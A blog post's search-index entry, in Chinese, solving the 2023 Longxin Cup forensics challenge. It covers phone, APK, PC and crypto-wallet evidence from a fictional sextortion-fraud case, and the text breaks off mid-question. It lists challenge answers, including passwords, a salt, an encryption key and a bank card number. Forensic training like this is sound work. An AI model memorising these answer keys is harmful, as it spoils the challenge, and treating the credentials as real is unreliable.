<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>龙信杯复现（23、24）</title>
      <link href="/2024/10/07/%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81/"/>
      <url>/2024/10/07/%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="龙信杯取证竞赛"><a href="#龙信杯取证竞赛" class="headerlink" title="龙信杯取证竞赛"></a>龙信杯取证竞赛</h1><h2 id="2023龙信杯"><a href="#2023龙信杯" class="headerlink" title="2023龙信杯"></a>2023龙信杯</h2><p>2023年龙信检材挂载密码：RLEQc2Xe65Q5GiCuRNMFrw&#x3D;&#x3D;</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="https://blog.csdn.net/weixin_72667582/article/details/133338671">2023年第一届龙信杯电子数据取证竞赛(流量+服务器部分)</a></li><li><a href="https://blog.csdn.net/Tummyiii/article/details/133497561">2023年第一届“龙信杯”电子数据取证竞赛</a></li><li><a href="https://blog.csdn.net/m0_73605862/article/details/133365205">2023龙信杯虚拟币分析</a></li><li><a href="https://blog.csdn.net/m0_73605862/article/details/133467052">2023龙信杯流量分析wp</a></li><li><a href="https://www.cnblogs.com/WXjzc/p/17728788.html">2023龙信杯    </a></li><li><a href="https://blog.csdn.net/jyttttttt/article/details/133277186?spm=1001.2014.3001.5502">第一届“龙信杯”电子数据取证竞赛Writeup</a></li><li><a href="https://mp.weixin.qq.com/s/7dqpcQJSRWBJD7Z3BLLQaw">案例剖析：解决宝塔强制手机绑定问题的取证技巧与方法——王海迪</a></li></ol><h3 id="案情介绍"><a href="#案情介绍" class="headerlink" title="案情介绍"></a>案情介绍</h3><blockquote><p>​2023年9月，某公安机关指挥中心接受害人报案:通过<strong>即时通讯工具</strong>添加认识一位叫“<strong>周微</strong>”的女人，两人谈论甚欢，确定网上恋爱关系，后邀约<strong>裸聊</strong>，受害人上钩后，“周微”和受害人进行裸聊，整个过程被涉诈团伙<strong>录音录像</strong>。同时周倩以自己做直播“涨粉”为由，引导受害人下载其事先制作好的<strong>木马APP</strong>，受害人安装该APP后，嫌疑人利用<strong>录制的视频</strong>和受害人的<strong>通讯录</strong>做要挟，从而实施诈骗。</p><p>​公安机关接警后，通过技术手段抓取了一段<strong>流量包</strong>，且通过公安机关的侦查与分析，锁定了该<strong>诈骗团伙</strong>的<strong>业务窝点</strong>，具了解，该团伙成员通过<strong>Telegram</strong> 联系<strong>ETH币商收币</strong>，双方在线上确定好了<strong>交易时间</strong>和<strong>交易金额（交易额为300万人民币）</strong>，<strong>并先由卖币方转0.5个ETH到买币方钱包</strong>。双方人员碰头后，商定分<strong>两笔</strong>交易交割，第一笔交易价值<strong>100万</strong>的虚拟货币、第二笔交易价值<strong>200万</strong>的虚拟货币。第一笔100万的币从卖币方的地址转到<strong>中转地址</strong>（由中间人控制），再由中转地址转到买币方提供的<strong>收币地址</strong>，买币方收到币后将带来的100万现金给卖币方清点，第一笔交易完成。 犯罪分子开始第二笔交易时，被警方当场截获。并将相关嫌疑人抓获，扣押<strong>安卓手机1部</strong>，<strong>笔记本电脑1台</strong>，<strong>调证服务器2台</strong>，以上检材以分别制作了镜像。检材清单见附件。请结合案情，对上述检材进行勘验与分析，完成以下题目。</p></blockquote><h3 id="检材清单"><a href="#检材清单" class="headerlink" title="检材清单"></a><strong>检材清单</strong></h3><table><thead><tr><th><em><strong>*对象*</strong></em></th><th><em><strong>*检材类型*</strong></em></th><th><em><strong>*检材名称*</strong></em></th></tr></thead><tbody><tr><td>嫌疑人</td><td>电脑</td><td>计算机镜像.7z（大小：14.3 GB，MD5：97b5ba6df341dce41ff635431d60f0cd）</td></tr><tr><td>手机</td><td>手机镜像.7z（大小：9.95 GB，MD5：98338c50d7642e16f81f0d81dc8325da）</td><td></td></tr><tr><td>调正数据</td><td>服务器1</td><td>服务器镜像1.7z（大小：1.60 GB，MD5：fddefefa05a053d9233b049b6615264c）</td></tr><tr><td>服务器2</td><td>服务器镜像2.7z（大小：2.70 GB，MD5：b5ccf6f93825f78463cecd007f2f9c7b）</td><td></td></tr><tr><td>公司</td><td>流量包</td><td>流量包.7z（大小：80.3 MB，MD5：2144d3397e03e0220bdb44a1df58dfbb）</td></tr></tbody></table><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h4><h5 id="id-1-名称-请分析涉案手机的设备标识是-。（标准格式：12345678）"><a href="#id-1-名称-请分析涉案手机的设备标识是-。（标准格式：12345678）" class="headerlink" title="id:1  名称:请分析涉案手机的设备标识是_______。（标准格式：12345678）"></a>id:1  名称:请分析涉案手机的设备标识是_______。（标准格式：12345678）</h5><p>85069625</p><p>弘连只能取出来app信息</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427839.png" alt="image-20240926215947435"></p><h5 id="id-2-名称-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）"><a href="#id-2-名称-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）" class="headerlink" title="id:2  名称:请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）"></a>id:2  名称:请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）</h5><p>2022-11-16.19:11:26</p><p>错误答案：2022-11-17.23:24:21</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427840.png" alt="image-20240926222901608"></p><p>可能是解压过程文件丢失了，不懂为什么没有</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427841.png" alt="image-20240928233808723"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427842.png" alt="image-20240928233757080"></p><h5 id="id-3-名称-此检材共连接过-个WiFi。（标准格式：1）"><a href="#id-3-名称-此检材共连接过-个WiFi。（标准格式：1）" class="headerlink" title="id:3  名称:此检材共连接过______个WiFi。（标准格式：1）"></a>id:3  名称:此检材共连接过______个WiFi。（标准格式：1）</h5><p>6</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427843.png" alt="image-20240926220729204"></p><h5 id="id-4-名称-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）"><a href="#id-4-名称-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）" class="headerlink" title="id:4  名称:嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）"></a>id:4  名称:嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）</h5><p>17</p><p>错误答案：8</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427844.png" alt="image-20240926225304713"></p><p>忘记设置列这个功能了</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427845.png" alt="image-20240928234125136"></p><h5 id="id-5-名称-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）"><a href="#id-5-名称-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）" class="headerlink" title="id:5  名称:嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：http://www.baidu.com/admin/index.html）"></a>id:5  名称:嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：<a href="http://www.baidu.com/admin/index.html%EF%BC%89">http://www.baidu.com/admin/index.html）</a></h5><p><a href="http://m.ziyuanhu.com/pics/1725.html">http://m.ziyuanhu.com/pics/1725.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427846.png" alt="image-20240926221331603"></p><h5 id="id-6-名称-请分析涉案海报的推广ID是-。（标准格式：123456）"><a href="#id-6-名称-请分析涉案海报的推广ID是-。（标准格式：123456）" class="headerlink" title="id:6  名称:请分析涉案海报的推广ID是________。（标准格式：123456）"></a>id:6  名称:请分析涉案海报的推广ID是________。（标准格式：123456）</h5><p>114092</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427848.png" alt="image-20240926221354179"></p><h5 id="id-7-名称-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）"><a href="#id-7-名称-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）" class="headerlink" title="id:7  名称:嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）"></a>id:7  名称:嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）</h5><p>1</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427849.png" alt="image-20240926225846493"></p><h5 id="id-8-名称-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）"><a href="#id-8-名称-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）" class="headerlink" title="id:8  名称:通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）"></a>id:8  名称:通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）</h5><p>Gq20221101</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427850.png" alt="image-20240926221900473"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427851.png" alt="image-20240926221702432"></p><h5 id="id-9-名称-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）"><a href="#id-9-名称-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）" class="headerlink" title="id:9  名称:请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）"></a>id:9  名称:请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）</h5><p>com.chuci.voice</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427852.png" alt="image-20240926222004560"></p><h5 id="id-10-名称-号商的联系人注册APP的ID是-。（标准格式：12345678）"><a href="#id-10-名称-号商的联系人注册APP的ID是-。（标准格式：12345678）" class="headerlink" title="id:10  名称:号商的联系人注册APP的ID是_________。（标准格式：12345678）"></a>id:10  名称:号商的联系人注册APP的ID是_________。（标准格式：12345678）</h5><p>36991915</p><p>错误答案：15563523</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427853.png" alt="image-20240926222030293"></p><p>找错了，应该找ID不是账号</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427854.png" alt="image-20240928234356924"></p><h5 id="id-11-名称-嫌疑人于2022年11月份在-城市。（标准格式：成都）"><a href="#id-11-名称-嫌疑人于2022年11月份在-城市。（标准格式：成都）" class="headerlink" title="id:11  名称:嫌疑人于2022年11月份在_______城市。（标准格式：成都）"></a>id:11  名称:嫌疑人于2022年11月份在_______城市。（标准格式：成都）</h5><p>苏州</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427855.png" alt="image-20240926222614483"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427856.png" alt="image-20240926222558662"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427857.png" alt="image-20240926222549446"></p><h5 id="id-12-名称-嫌疑人共购买-个QQ号。（标准格式：1）"><a href="#id-12-名称-嫌疑人共购买-个QQ号。（标准格式：1）" class="headerlink" title="id:12  名称:嫌疑人共购买_______个QQ号。（标准格式：1）"></a>id:12  名称:嫌疑人共购买_______个QQ号。（标准格式：1）</h5><p>8</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427858.png" alt="image-20240926222650749"></p><h4 id="APK取证"><a href="#APK取证" class="headerlink" title="APK取证"></a>APK取证</h4><h5 id="id-1-名称-分析手机镜像，导出涉案apk，此apk的md5值是-。（标准格式：abc123）"><a href="#id-1-名称-分析手机镜像，导出涉案apk，此apk的md5值是-。（标准格式：abc123）" class="headerlink" title="id:1 名称:分析手机镜像，导出涉案apk，此apk的md5值是________。（标准格式：abc123）"></a>id:1 名称:分析手机镜像，导出涉案apk，此apk的md5值是________。（标准格式：abc123）</h5><p>d56e1574c1e48375256510c58c2e92e5</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427859.png" alt="image-20240926225128931"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427860.png" alt="image-20240926225914868"></p><h5 id="id-2-名称-分析该apk，apk的包名是-。（标准格式：com-qqj-123）"><a href="#id-2-名称-分析该apk，apk的包名是-。（标准格式：com-qqj-123）" class="headerlink" title="id:2 名称:分析该apk，apk的包名是________。（标准格式：com.qqj.123）"></a>id:2 名称:分析该apk，apk的包名是________。（标准格式：com.qqj.123）</h5><p>lx.tiantian.com</p><p>同上</p><h5 id="id-3-名称-分析该apk，app的内部版本号是-。（标准格式：1-1）"><a href="#id-3-名称-分析该apk，app的内部版本号是-。（标准格式：1-1）" class="headerlink" title="id:3 名称:分析该apk，app的内部版本号是__________。（标准格式：1.1）"></a>id:3 名称:分析该apk，app的内部版本号是__________。（标准格式：1.1）</h5><p>1.0</p><p>同上</p><h5 id="id-4-名称-分析该apk，请问该apk最高支持运行的安卓版本是-。（标准格式：11）"><a href="#id-4-名称-分析该apk，请问该apk最高支持运行的安卓版本是-。（标准格式：11）" class="headerlink" title="id:4 名称:分析该apk，请问该apk最高支持运行的安卓版本是_______。（标准格式：11）"></a>id:4 名称:分析该apk，请问该apk最高支持运行的安卓版本是_______。（标准格式：11）</h5><p>12</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427861.png" alt="image-20240926230132371"></p><h5 id="id-5-名称-分析该apk，app的主函数入口是-。（标准格式：com-qqj-123-MainActivity）"><a href="#id-5-名称-分析该apk，app的主函数入口是-。（标准格式：com-qqj-123-MainActivity）" class="headerlink" title="id:5 名称:分析该apk，app的主函数入口是_________。（标准格式：com.qqj.123.MainActivity）"></a>id:5 名称:分析该apk，app的主函数入口是_________。（标准格式：com.qqj.123.MainActivity）</h5><p>lx.tiantian.com.activity.MainActivity</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427862.png" alt="image-20240926230837899"></p><h5 id="id-6-名称-分析该apk，请问窃取短信的权限名称是-。（标准格式：android-permission-NETWORK）"><a href="#id-6-名称-分析该apk，请问窃取短信的权限名称是-。（标准格式：android-permission-NETWORK）" class="headerlink" title="id:6 名称:分析该apk，请问窃取短信的权限名称是________。（标准格式：android.permission.NETWORK）"></a>id:6 名称:分析该apk，请问窃取短信的权限名称是________。（标准格式：android.permission.NETWORK）</h5><p>android.permission.READ_SMS</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427863.png" alt="image-20240926230900210"></p><h5 id="id-7-名称-APP使用的OPPO的appkey值是-。（标准格式：AB-12345678）"><a href="#id-7-名称-APP使用的OPPO的appkey值是-。（标准格式：AB-12345678）" class="headerlink" title="id:7 名称:APP使用的OPPO的appkey值是________。（标准格式：AB-12345678）"></a>id:7 名称:APP使用的OPPO的appkey值是________。（标准格式：AB-12345678）</h5><p>OP-264m10v633PC8ws8cwOOc4c0w</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427864.png" alt="image-20240926230922919"></p><h5 id="id-8-名称-分析apk源码，该APK后台地址是-。（标准格式：com-qqj-123）"><a href="#id-8-名称-分析apk源码，该APK后台地址是-。（标准格式：com-qqj-123）" class="headerlink" title="id:8 名称:分析apk源码，该APK后台地址是________。（标准格式：com.qqj.123）"></a>id:8 名称:分析apk源码，该APK后台地址是________。（标准格式：com.qqj.123）</h5><p>app.goyasha.com</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427865.png" alt="image-20240926231925726"></p><h5 id="id-9-名称-分析apk源码，APP-后台地址登录的盐值是-。（标准格式：123abc-）"><a href="#id-9-名称-分析apk源码，APP-后台地址登录的盐值是-。（标准格式：123abc-）" class="headerlink" title="id:9 名称:分析apk源码，APP 后台地址登录的盐值是_______。（标准格式：123abc&#x3D;%$&amp;）"></a>id:9 名称:分析apk源码，APP 后台地址登录的盐值是_______。（标准格式：123abc&#x3D;%$&amp;）</h5><p>73g&#x3D;s%!lvi8h&#x3D;i7a4ge*o3s@h2n^5_yk&#x3D;-y#@p6)feidfjol8@</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427866.png" alt="image-20240926231937805"></p><h5 id="id-10-名称-分析apk源码，该APK后台地址登录密码是-。（标准格式：longxin123）"><a href="#id-10-名称-分析apk源码，该APK后台地址登录密码是-。（标准格式：longxin123）" class="headerlink" title="id:10 名称:分析apk源码，该APK后台地址登录密码是______。（标准格式：longxin123）"></a>id:10 名称:分析apk源码，该APK后台地址登录密码是______。（标准格式：longxin123）</h5><p>lxtiantiancom</p><p>同上</p><h5 id="id-11-名称-对-APP-安装包进行分析，该-APP打包平台调证值是-。（标准格式：HER45678）"><a href="#id-11-名称-对-APP-安装包进行分析，该-APP打包平台调证值是-。（标准格式：HER45678）" class="headerlink" title="id:11 名称:对 APP 安装包进行分析，该 APP打包平台调证值是______。（标准格式：HER45678）"></a>id:11 名称:对 APP 安装包进行分析，该 APP打包平台调证值是______。（标准格式：HER45678）</h5><p>H5D9D11EA</p><p>唯一像答案的就是这个了，但是我不太清楚DCLOUD_AD_ID是什么意思</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427867.png" alt="image-20240928235434225"></p><h5 id="id-12-名称-此apk抓包获取到的可访问网站域名IP地址是-。（标准格式：192-168-1-1）"><a href="#id-12-名称-此apk抓包获取到的可访问网站域名IP地址是-。（标准格式：192-168-1-1）" class="headerlink" title="id:12 名称:此apk抓包获取到的可访问网站域名IP地址是_______。（标准格式：192.168.1.1）"></a>id:12 名称:此apk抓包获取到的可访问网站域名IP地址是_______。（标准格式：192.168.1.1）</h5><p>192.168.5.80</p><p>同上上</p><h5 id="id-13-名称-分析apk源码，该apk的加密方式key值是-。（标准格式：12345678）"><a href="#id-13-名称-分析apk源码，该apk的加密方式key值是-。（标准格式：12345678）" class="headerlink" title="id:13 名称:分析apk源码，该apk的加密方式key值是________。（标准格式：12345678）"></a>id:13 名称:分析apk源码，该apk的加密方式key值是________。（标准格式：12345678）</h5><p>ade4b1f8a9e6b666</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427868.png" alt="image-20240927210636718"></p><h5 id="id-14-名称-结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是-。（标准格式：4001122334）"><a href="#id-14-名称-结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是-。（标准格式：4001122334）" class="headerlink" title="id:14 名称:结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是__。（标准格式：4001122334）"></a>id:14 名称:结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是__。（标准格式：4001122334）</h5><p>4008522366</p><p>结合计算机第九题</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427869.png" alt="image-20240929001849488"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427870.png" alt="image-20240929001838479"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427871.png" alt="image-20240929001922572"></p><h4 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h4><h5 id="id-1-名称-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）"><a href="#id-1-名称-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）" class="headerlink" title="id:1 名称:对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）"></a>id:1 名称:对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）</h5><p> Longxin360004</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427872.png" alt="image-20240927211911959"></p><h5 id="id-2-名称-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）"><a href="#id-2-名称-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）" class="headerlink" title="id:2 名称:涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）"></a>id:2 名称:涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）</h5><p>2023-09-16.18:20:34</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427873.png" alt="image-20240927212519012"></p><h5 id="id-3-名称-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）"><a href="#id-3-名称-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）" class="headerlink" title="id:3 名称:分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）"></a>id:3 名称:分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）</h5><p>13小时41分钟16秒</p><p>官方答案不管，还要加上前一天12点到今天的时间</p><p>错误答案：3小时58分钟24秒</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427874.png" alt="image-20240927212945176"></p><h5 id="id-4-名称-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-否）"><a href="#id-4-名称-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-否）" class="headerlink" title="id:4 名称:对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）"></a>id:4 名称:对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）</h5><p>是</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427875.png" alt="image-20240927213249496"></p><h5 id="id-5-名称-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）"><a href="#id-5-名称-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）" class="headerlink" title="id:5 名称:检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）"></a>id:5 名称:检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）</h5><p>Mimi1234</p><p>BitLocker加密分区密钥弘联自动分析出来的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427876.png" alt="image-20240927232226326"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427877.png" alt="image-20240927221600073"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427878.png" alt="image-20240927221510769"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427879.png" alt="image-20240927221542081"></p><h5 id="id-6-名称-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）"><a href="#id-6-名称-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）" class="headerlink" title="id:6 名称:接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）"></a>id:6 名称:接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）</h5><p>19821</p><p>错误答案：25532</p><p>加密分区里有一个微信内存文件，可以通过龙信内存取证得到</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427880.png" alt="image-20240927232319551"></p><p>密钥解开微信信息加密，就可以看这两个文件了，一开始是404，我重新取了一遍，文件.zip密码就是Mimi1234</p><p>下面的文件日期是20221121，上面的是20221031</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427881.png" alt="image-20240927232823653"></p><h5 id="id-7-名称-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）"><a href="#id-7-名称-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）" class="headerlink" title="id:7 名称:对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）"></a>id:7 名称:对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）</h5><p>Longxin@2023</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427882.png" alt="image-20240927223338954"></p><h5 id="id-8-名称-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）"><a href="#id-8-名称-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）" class="headerlink" title="id:8 名称:结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）"></a>id:8 名称:结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）</h5><p>C:\Program Files (x86)\Tencent\WeChat\2.png</p><p>错误答案：C:\Users\Public\Documents\1221\1.png</p><p>找到两张图片，md5也一样（不知道为什么我算到一样了，实际上不一样）</p><p>C:\Users\Public\Documents\1221\1.png</p><p>C:\Program Files (x86)\Tencent\WeChat\2.png</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427883.png" alt="image-20240927230913785"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427884.png" alt="image-20240927233934069"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427885.png" alt="image-20240927233958542"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427886.png" alt="image-20240927230921322"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427887.png" alt="image-20240929000832987"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427888.png" alt="image-20240929000843603"></p><p>2.png最后有银行卡号6320005020052013476</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427889.png" alt="image-20240929000905619"></p><h5 id="id-9-名称-请找出嫌疑人的2022年收入共-。（标准格式：123）"><a href="#id-9-名称-请找出嫌疑人的2022年收入共-。（标准格式：123）" class="headerlink" title="id:9 名称:请找出嫌疑人的2022年收入共_______。（标准格式：123）"></a>id:9 名称:请找出嫌疑人的2022年收入共_______。（标准格式：123）</h5><p>205673</p><p>容器存储.dd解密用上题图片作为密钥文件解密，选择TC模式</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427890.png" alt="image-20240929001143067"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427891.png" alt="image-20240929001207639"></p><p>xways打开</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427892.png" alt="image-20240929002522746"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427893.png" alt="image-20240929002528045"></p><h5 id="id-10-名称-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"><a href="#id-10-名称-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）" class="headerlink" title="id:10 名称:分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"></a>id:10 名称:分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）</h5><p>6320005020052013476</p><p>计算机第8题</p><p>错误答案：6523365008214741321</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427894.png" alt="image-20240927233239090"></p><h4 id="虚拟币分析"><a href="#虚拟币分析" class="headerlink" title="虚拟币分析"></a>虚拟币分析</h4><p>夜神模拟器导入计算机第9题的npbk文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427895.png" alt="image-20240929002803668"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427896.png" alt="image-20240929002908407"></p><h5 id="id-1-名称-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）"><a href="#id-1-名称-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）" class="headerlink" title="id:1 名称:分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）"></a>id:1 名称:分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）</h5><p>ETH</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427897.png" alt="image-20240929003006116"></p><h5 id="id-2-名称-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）"><a href="#id-2-名称-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）" class="headerlink" title="id:2 名称:分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）"></a>id:2 名称:分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）</h5><p>4.498111780847082000</p><p>错误答案：0</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427898.png" alt="image-20240929003133825"></p><p>改zip文件，解压出来是vmdk文件，挂载找数据库</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427899.png" alt="image-20240929004532485"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427900.png" alt="image-20240929004553291"></p><p>格式化json文档，精确度18位</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427901.png" alt="image-20240929004956750"></p><h5 id="id-3-名称-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC"><a href="#id-3-名称-根据中转地址转账记录找出买币方地址。买币方地址：-（标准格式：0x123ABC" class="headerlink" title="id:3 